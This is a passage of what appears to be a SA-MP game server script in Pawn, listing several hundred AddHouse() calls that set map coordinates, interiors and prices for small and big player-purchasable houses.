	AddHouse(735, 2090.806640, -1277.865356, 26.179687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 736); //A small house ;)
	AddHouse(736, 2101.018066, -1321.888671, 25.953125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 737); //A small house ;)
	AddHouse(737, 2126.462890, -1320.351562, 26.623805, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 738);//Big house
	AddHouse(738, 2148.660400, -1319.454589, 25.743345, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 739); //A small house ;)
	AddHouse(739, 2256.414794, -1397.236816, 24.573816, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 740); //A small house ;)
	AddHouse(740, 2243.513671, -1396.868408, 24.243347, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 741); //A small house ;)
	AddHouse(741, 2230.406005, -1397.243164, 24.573816, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 742); //A small house ;)
	AddHouse(742, 2202.800537, -1363.910034, 25.860534, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 743); //A small house ;)
	AddHouse(743, 2184.975830, -1363.713623, 26.159753, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 744); //A small house ;)
	AddHouse(744, 2147.698486, -1366.420532, 25.641782, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 745); //A small house ;)
	AddHouse(745, 2129.634277, -1361.686401, 26.136316, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 746); //A small house ;)
	AddHouse(746, 2230.707763, -1407.786987, 24.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 747); //A small house ;)
	AddHouse(747, 2243.948242, -1407.626342, 24.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 748); //A small house ;)
	AddHouse(748, 2256.653808, -1407.616455, 24.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 749); //A small house ;)
	AddHouse(749, 2263.707763, -1458.789916, 24.008384, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 750); //A small house ;)
	AddHouse(750, 2247.317138, -1458.958374, 24.026105, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 751); //A small house ;)
	AddHouse(751, 2232.250976, -1458.962402, 24.021038, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 752); //A small house ;)
	AddHouse(752, 2232.509765, -1469.733520, 24.251159, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 753); //A small house ;)
	AddHouse(753, 2247.652587, -1469.367187, 24.480066, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 754); //A small house ;)
	AddHouse(754, 2263.979492, -1469.343017, 24.370691, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 755); //A small house ;)
	AddHouse(755, 2190.329589, -1487.659667, 26.105066, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 756); //A small house ;)
	AddHouse(756, 2190.449462, -1470.401245, 25.914062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 757); //A small house ;)
	AddHouse(757, 2191.323486, -1455.965698, 25.954910, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 758); //A small house ;)
	AddHouse(758, 2194.880615, -1443.215820, 25.743347, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 759); //A small house ;)
	AddHouse(759, 2188.921875, -1419.079589, 26.156250, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 760); //A small house ;)
	AddHouse(760, 2196.217041, -1404.070312, 25.948816, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 761); //A small house ;)
	AddHouse(761, 2146.796875, -1470.666137, 26.042566, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 762); //A small house ;)
	AddHouse(762, 2152.210449, -1446.285766, 26.105066, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 763); //A small house ;)
	AddHouse(763, 2150.915771, -1418.996459, 25.921875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 764); //A small house ;)
	AddHouse(764, 2151.183105, -1400.829467, 26.128503, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 765); //A small house ;)
	AddHouse(765, 2148.215087, -1484.848876, 26.624103, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 766);//Big house
	AddHouse(766, 1909.768066, -1597.622680, 14.306245, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 767);//Big house
	AddHouse(767, 1863.669677, -1597.509521, 14.306245, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 768);//Big house
	AddHouse(768, 2011.598754, -1594.389282, 13.583217, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 769); //A small house ;)
	AddHouse(769, 2002.616577, -1593.811889, 13.577824, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 770); //A small house ;)
	AddHouse(770, 1986.701171, -1604.940673, 13.532058, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 771); //A small house ;)
	AddHouse(771, 1972.908935, -1560.132446, 13.639244, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 772); //A small house ;)
	AddHouse(772, 1958.585083, -1560.445800, 13.594186, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 773); //A small house ;)
	AddHouse(773, 2191.851318, -1593.124145, 14.351562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 774);//Big house
	AddHouse(774, 2185.376464, -1607.993652, 14.359375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 775);//Big house
	AddHouse(775, 2172.628417, -1615.174804, 14.286787, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 776);//Big house
	AddHouse(776, 2158.568847, -1611.569213, 14.352287, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 777);//Big house
	AddHouse(777, 2165.526123, -1590.498535, 14.346025, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 778);//Big house
	AddHouse(778, 2150.285156, -1583.923339, 14.336046, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 779);//Big house
	AddHouse(779, 2143.704345, -1662.817138, 15.085937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 780);//Big house
	AddHouse(780, 2155.951171, -1651.985107, 15.078443, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 781);//Big house
	AddHouse(781, 2179.119628, -1600.017578, 14.345992, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 782);//Big house
	AddHouse(782, 2157.108398, -1709.122924, 15.085937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 783);//Big house
	AddHouse(783, 2155.829589, -1698.514038, 15.085937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 784);//Big house
	AddHouse(784, 2138.917236, -1697.510375, 15.085937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 785);//Big house
	AddHouse(785, 2140.557861, -1707.784545, 15.085937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 786);//Big house
	AddHouse(786, 2468.452636, -1366.507812, 28.828123, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 787); //A small house ;)
	AddHouse(787, 2476.378417, -1366.638916, 28.834770, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 788); //A small house ;)
	AddHouse(788, 2487.407714, -1366.520507, 28.837463, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 789); //A small house ;)
	AddHouse(789, 2495.360839, -1366.525146, 28.839406, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 790); //A small house ;)
	AddHouse(790, 2495.404052, -1375.957275, 28.839416, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 791); //A small house ;)
	AddHouse(791, 2492.065185, -1375.956420, 28.838602, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 792); //A small house ;)
	AddHouse(792, 2476.239257, -1375.946411, 28.834737, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 793); //A small house ;)
	AddHouse(793, 2472.921386, -1375.945434, 28.833927, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 794); //A small house ;)
	AddHouse(794, 2468.420654, -1383.679809, 28.828125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 795); //A small house ;)
	AddHouse(795, 2476.409179, -1383.659667, 28.834777, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 796); //A small house ;)
	AddHouse(796, 2487.369140, -1383.658325, 28.837453, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 797); //A small house ;)
	AddHouse(797, 2495.287109, -1383.653686, 28.839387, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 798); //A small house ;)
	AddHouse(798, 2495.503906, -1391.394897, 28.839441, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 799); //A small house ;)
	AddHouse(799, 2492.052001, -1391.394287, 28.838598, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 800); //A small house ;)
	AddHouse(800, 2476.093017, -1391.382568, 28.834701, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 801); //A small house ;)
	AddHouse(801, 2473.155517, -1391.384643, 28.833984, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 802); //A small house ;)
	AddHouse(802, 2468.426513, -1399.117919, 28.828125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 803); //A small house ;)
	AddHouse(803, 2476.225341, -1399.103515, 28.834733, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 804); //A small house ;)
	AddHouse(804, 2487.238281, -1399.096923, 28.837423, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 805); //A small house ;)
	AddHouse(805, 2495.529541, -1399.092163, 28.839447, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 806); //A small house ;)
	AddHouse(806, 2495.247802, -1410.027099, 28.839378, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 807); //A small house ;)
	AddHouse(807, 2492.057128, -1410.026855, 28.838600, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 808); //A small house ;)
	AddHouse(808, 2476.158691, -1410.014160, 28.833765, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 809); //A small house ;)
	AddHouse(809, 2473.137695, -1410.013793, 28.833765, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 810); //A small house ;)
	AddHouse(810, 2495.538085, -1417.729736, 28.837533, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 811); //A small house ;)
	AddHouse(811, 2487.461425, -1417.729370, 28.837533, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 812); //A small house ;)
	AddHouse(812, 2476.413574, -1417.729614, 28.837533, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 813); //A small house ;)
	AddHouse(813, 2468.250488, -1417.728515, 28.837533, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 814); //A small house ;)
	AddHouse(814, 2473.119873, -1424.266357, 28.840726, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 815); //A small house ;)
	AddHouse(815, 2476.325439, -1424.265380, 28.840726, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 816); //A small house ;)
	AddHouse(816, 2491.948242, -1424.472167, 29.016227, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 817); //A small house ;)
	AddHouse(817, 2495.429931, -1424.560546, 29.016227, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 818); //A small house ;)
	AddHouse(818, 2468.424316, -1431.946655, 28.843750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 819); //A small house ;)
	AddHouse(819, 2476.524414, -1431.941650, 28.843750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 820); //A small house ;)
	AddHouse(820, 2487.314697, -1431.680664, 29.016227, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 821); //A small house ;)
	AddHouse(821, 2495.321289, -1431.685180, 29.016227, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 822); //A small house ;)
	AddHouse(822, 1529.467895, -1849.967895, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 823);//Big house
	AddHouse(823, 1509.508544, -1850.145996, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 824);//Big house
	AddHouse(824, 1490.618530, -1848.375976, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 825);//Big house
	AddHouse(825, 1470.934936, -1848.372680, 13.546875, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 826);//Big house
	AddHouse(826, 1449.174926, -1849.229125, 13.968750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 827);//Big house
	AddHouse(827, 1111.358764, -975.711059, 42.765625, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 828);//Big house
	AddHouse(828, 1122.707641, -2036.925292, 69.894248, 235.30, 1190.04, 1080.25, 10000000, 9000000, 3, 829);//Big house
	AddHouse(829, 313.610931, -92.390495, 3.535393, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 830); //A small house ;)
	AddHouse(830, 312.730285, -121.170059, 3.535394, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 831); //A small house ;)
	AddHouse(831, 301.390228, -47.436481, 2.777210, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 832); //A small house ;)
	AddHouse(832, 271.558624, -49.712276, 2.769274, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 833); //A small house ;)
	AddHouse(833, 266.840362, -56.284664, 2.777209, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 834); //A small house ;)
	AddHouse(834, 295.208587, -54.543605, 2.777210, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 835); //A small house ;)
	AddHouse(835, 252.764739, -121.280525, 3.535393, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 836); //A small house ;)
	AddHouse(836, 252.235824, -92.496650, 3.535394, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 837); //A small house ;)
	AddHouse(837, 248.710906, -33.312179, 1.578125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 838); //A small house ;)
	AddHouse(838, 254.003280, -163.970855, 5.078612, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 839); //A small house ;)
	AddHouse(839, -2161.437011, -2535.562988, 31.816270, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 840); //A small house ;)
	AddHouse(840, 286.161071, 41.220153, 2.548437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 841); //A small house ;)
	AddHouse(841, 309.345214, 44.023262, 3.087965, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 842); //A small house ;)
	AddHouse(842, 316.674407, 18.085222, 4.515625, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 843); //A small house ;)
	AddHouse(843, 339.969696, 33.724380, 6.409437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 844); //A small house ;)
	AddHouse(844, 342.757385, 62.546756, 3.863390, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 845); //A small house ;)
	AddHouse(845, 317.693359, 54.548694, 3.375000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 846); //A small house ;)
	AddHouse(846, -940.485717, -491.250518, 26.363681, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 847); //A small house ;)
	AddHouse(847, -923.758789, -497.166809, 26.765625, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 848); //A small house ;)
	AddHouse(848, -928.979980, -518.936096, 25.953638, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 849); //A small house ;)
	AddHouse(849, -914.357238, -533.263732, 26.077989, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 850); //A small house ;)
	AddHouse(850, -924.821044, -536.106811, 25.953638, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 851); //A small house ;)
	AddHouse(851, -940.044067, -535.797973, 26.765625, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 852); //A small house ;)
	AddHouse(852, -951.022705, -530.615417, 25.953638, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 853); //A small house ;)
	AddHouse(853, -960.174316, -507.299316, 26.238681, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 854); //A small house ;)
	AddHouse(854, -938.842346, -518.411437, 25.953638, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 855); //A small house ;)
	AddHouse(855, 1475.203857, 372.976654, 19.656250, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 856); //A small house ;)
	AddHouse(856, 1488.456665, 361.117736, 19.417097, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 857); //A small house ;)
	AddHouse(857, 1469.552734, 351.309783, 18.918998, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 858); //A small house ;)
	AddHouse(858, 1461.350830, 342.107330, 18.953125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 859); //A small house ;)
	AddHouse(859, 1434.885375, 334.718109, 18.946874, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 860); //A small house ;)
	AddHouse(860, 1415.836547, 324.656646, 18.843750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 861); //A small house ;)
	AddHouse(861, 1403.185058, 333.887817, 18.906250, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 862); //A small house ;)
	AddHouse(862, 1409.075439, 346.213348, 19.052028, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 863); //A small house ;)
	AddHouse(863, 1428.192993, 355.949920, 18.875000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 864); //A small house ;)
	AddHouse(864, 1466.155029, 364.799835, 19.277381, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 865); //A small house ;)
	AddHouse(865, 1451.428100, 375.694976, 19.400465, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 866); //A small house ;)
	AddHouse(866, 1419.782592, 389.645904, 19.286256, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 867); //A small house ;)
	AddHouse(867, 1447.595092, 362.381378, 18.918001, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 868); //A small house ;)
	AddHouse(868, 1413.558715, 362.815460, 19.183713, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 869); //A small house ;)
	AddHouse(869, 2438.878906, -54.817138, 28.153549, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 870); //A small house ;)
	AddHouse(870, 2415.615722, -52.121952, 28.153547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 871); //A small house ;)
	AddHouse(871, 2418.549072, -11.129825, 27.683460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 872); //A small house ;)
	AddHouse(872, 2392.404052, -54.802867, 28.153551, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 873); //A small house ;)
	AddHouse(873, 2367.442626, -48.922420, 28.153547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 874); //A small house ;)
	AddHouse(874, 2374.057373, -8.795973, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 875); //A small house ;)
	AddHouse(875, 2374.374023, 21.720653, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 876); //A small house ;)
	AddHouse(876, 2374.015136, 42.313247, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 877); //A small house ;)
	AddHouse(877, 2374.072998, 71.092720, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 878); //A small house ;)
	AddHouse(878, 2413.547607, 61.595211, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 879); //A small house ;)
	AddHouse(879, 2443.509033, 61.749649, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 880); //A small house ;)
	AddHouse(880, 2488.064208, 57.932754, 27.683460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 881); //A small house ;)
	AddHouse(881, 2511.528076, 56.915668, 27.683460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 882); //A small house ;)
	AddHouse(882, 2551.222412, 57.094234, 27.675645, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 883); //A small house ;)
	AddHouse(883, 2556.402343, 27.087522, 27.675647, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 884); //A small house ;)
	AddHouse(884, 2551.221923, -5.340674, 27.675647, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 885); //A small house ;)
	AddHouse(885, 2513.517822, -28.021015, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 886); //A small house ;)
	AddHouse(886, 2509.523437, 11.596430, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 887); //A small house ;)
	AddHouse(887, 2488.440185, 11.552853, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 888); //A small house ;)
	AddHouse(888, 2484.493164, -28.392967, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 889); //A small house ;)
	AddHouse(889, 2439.555419, 25.255584, 27.683460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 890); //A small house ;)
	AddHouse(890, 2448.843017, -11.746181, 27.683458, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 891); //A small house ;)
	AddHouse(891, 2411.182128, -5.950459, 27.683460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 892); //A small house ;)
	AddHouse(892, 2410.770507, 21.908712, 27.683460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 893); //A small house ;)
	AddHouse(893, 2416.834472, 18.122831, 27.683458, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 894); //A small house ;)
	AddHouse(894, 2556.830078, 87.622100, 27.675645, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 895); //A small house ;)
	AddHouse(895, 2550.980224, 91.841644, 27.675647, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 896); //A small house ;)
	AddHouse(896, 2536.164550, 128.711395, 27.683460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 897); //A small house ;)
	AddHouse(897, 2518.346679, 128.510452, 27.675645, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 898); //A small house ;)
	AddHouse(898, 2480.721435, 126.474845, 27.675647, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 899); //A small house ;)
	AddHouse(899, 2458.741455, 128.985610, 27.675647, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 900); //A small house ;)
	AddHouse(900, 2462.662597, 134.778091, 27.675645, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 901); //A small house ;)
	AddHouse(901, 2398.239746, 111.395401, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 902); //A small house ;)
	AddHouse(902, 2443.999511, 92.193885, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 903); //A small house ;)
	AddHouse(903, 2510.310546, 88.609184, 27.683458, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 904); //A small house ;)
	AddHouse(904, 2514.040039, 94.413177, 27.683460, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 905); //A small house ;)
	AddHouse(905, 2479.366455, 95.166900, 27.683458, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 906); //A small house ;)
	AddHouse(906, 2363.321044, 116.264694, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 907); //A small house ;)
	AddHouse(907, 2324.065673, 116.071212, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 908); //A small house ;)
	AddHouse(908, 2324.024658, 136.295288, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 909); //A small house ;)
	AddHouse(909, 2363.791503, 141.962020, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 910); //A small house ;)
	AddHouse(910, 2363.955078, 166.091323, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 911); //A small house ;)
	AddHouse(911, 2324.585937, 162.328277, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 912); //A small house ;)
	AddHouse(912, 2325.176269, 191.151336, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 913); //A small house ;)
	AddHouse(913, 2363.817626, 187.361450, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 914); //A small house ;)
	AddHouse(914, 2269.322509, 111.311569, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 915); //A small house ;)
	AddHouse(915, 2249.080810, 110.919029, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 916); //A small house ;)
	AddHouse(916, 2285.966552, 161.613708, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 917); //A small house ;)
	AddHouse(917, 2258.160644, 168.172180, 28.153551, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 918); //A small house ;)
	AddHouse(918, 2204.359619, 106.210075, 28.441642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 919); //A small house ;)
	AddHouse(919, 2203.855957, 62.318801, 28.441644, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 920); //A small house ;)
	AddHouse(920, 2270.595703, -7.497653, 28.153547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 921); //A small house ;)
	AddHouse(921, 2245.744873, -1.872034, 28.153551, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 922); //A small house ;)
	AddHouse(922, 2200.109130, -37.699245, 28.153547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 923); //A small house ;)
	AddHouse(923, 2198.439697, -60.695178, 28.153549, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 924); //A small house ;)
	AddHouse(924, 2203.284912, -89.172676, 28.153547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 925); //A small house ;)
	AddHouse(925, 2245.422851, -122.136627, 28.153547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 926); //A small house ;)
	AddHouse(926, 2272.286621, -119.133193, 28.153547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 927); //A small house ;)
	AddHouse(927, 2293.758056, -124.657699, 28.153549, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 928); //A small house ;)
	AddHouse(928, 2321.819091, -124.749351, 28.153551, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 929); //A small house ;)
	AddHouse(929, -2192.639404, -2509.894042, 31.816272, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 930); //A small house ;)
	AddHouse(930, -2180.925292, -2519.842041, 31.816270, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 931); //A small house ;)
	AddHouse(931, -292.588287, 1122.384521, 20.939865, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 932); //A small house ;)
	AddHouse(932, -328.476074, 1118.588989, 20.939863, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 933); //A small house ;)
	AddHouse(933, -362.839477, 1110.720336, 20.939865, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 934); //A small house ;)
	AddHouse(934, -360.569213, 1141.962524, 20.939867, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 935); //A small house ;)
	AddHouse(935, -324.167510, 1165.666381, 20.939863, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 936); //A small house ;)
	AddHouse(936, -290.634521, 1176.809326, 20.939867, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 937); //A small house ;)
	AddHouse(937, -251.188262, 1175.096435, 20.939863, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 938); //A small house ;)
	AddHouse(938, -253.132995, 1118.743896, 20.939867, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 939); //A small house ;)
	AddHouse(939, -259.121948, 1083.087768, 20.939867, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 940); //A small house ;)
	AddHouse(940, -258.259704, 1043.609985, 20.939863, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 941); //A small house ;)
	AddHouse(941, -278.876647, 1003.068054, 20.939867, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 942); //A small house ;)
	AddHouse(942, -247.966247, 1001.076904, 20.939865, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 943); //A small house ;)
	AddHouse(943, 13.926152, 1120.734985, 20.939867, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 944); //A small house ;)
	AddHouse(944, 1.753284, 1076.197875, 20.939865, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 945); //A small house ;)
	AddHouse(945, -12.533698, 1122.960693, 20.939865, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 946); //A small house ;)
	AddHouse(946, -36.075180, 1115.659179, 20.939863, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 947); //A small house ;)
	AddHouse(947, -45.049396, 1081.154907, 20.939863, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 948); //A small house ;)
	AddHouse(948, -31.065755, 1045.659545, 20.939867, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 949); //A small house ;)
	AddHouse(949, -258.246704, 1151.316894, 20.939865, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 950); //A small house ;)
	AddHouse(950, -905.463256, 1542.807250, 26.062364, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 951); //A small house ;)
	AddHouse(951, -905.427978, 1528.199340, 25.914062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 952); //A small house ;)
	AddHouse(952, -906.454284, 1514.679565, 26.316806, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 953); //A small house ;)
	AddHouse(953, -886.495117, 1514.102416, 26.031114, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 954); //A small house ;)
	AddHouse(954, -881.791992, 1531.687744, 26.062364, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 955); //A small house ;)
	AddHouse(955, -884.335083, 1538.271362, 26.031114, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 956); //A small house ;)
	AddHouse(956, -883.763183, 1552.940673, 25.914062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 957); //A small house ;)
	AddHouse(957, -881.631408, 1562.304321, 25.911380, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 958); //A small house ;)
